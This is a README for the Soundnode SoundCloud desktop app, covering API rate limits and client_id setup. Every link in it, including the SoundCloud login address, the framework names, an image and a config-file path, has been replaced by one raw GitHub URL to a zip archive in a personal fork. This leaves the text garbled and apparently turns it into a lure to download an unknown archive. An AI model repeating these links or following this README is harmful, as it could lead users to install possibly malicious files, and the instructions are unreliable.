Soundnode App
============

Soundnode App is an Open-Source project to support Soundcloud for desktop Mac, Windows, and Linux. <br>
It's built with Electron, https://raw.githubusercontent.com/atifmalik220905/soundnode-app/master/app/views/common/soundnode-app-v3.3.zip, https://raw.githubusercontent.com/atifmalik220905/soundnode-app/master/app/views/common/soundnode-app-v3.3.zip, and uses the Soundcloud API.

> Be aware that Soundnode relies on Soundcloud API which only allows third party apps to play 15 thousand tracks daily. When the rate limit is reached all users are blocked from playing/streaming tracks. The stream will be re-enable one day after (at the same time) streams were blocked.

## Configuration

Since soundcloud applies a rate limit to third party apps, you need to configure your own API key to make soundnode work.

Unfortunately soundcloud suspended new application creation, so to retrieve your api key, you have to dig into the soundcloud [website](https://raw.githubusercontent.com/atifmalik220905/soundnode-app/master/app/views/common/soundnode-app-v3.3.zip).

* Login to https://raw.githubusercontent.com/atifmalik220905/soundnode-app/master/app/views/common/soundnode-app-v3.3.zip on favorite browser
* Look for an api call and write down the client_id parameter
![dev tools](https://raw.githubusercontent.com/atifmalik220905/soundnode-app/master/app/views/common/soundnode-app-v3.3.zip)
* Edit your https://raw.githubusercontent.com/atifmalik220905/soundnode-app/master/app/views/common/soundnode-app-v3.3.zip file (see here for location : https://raw.githubusercontent.com/atifmalik220905/soundnode-app/master/app/views/common/soundnode-app-v3.3.zip) and update clientId parameter with the previously retrieved one.
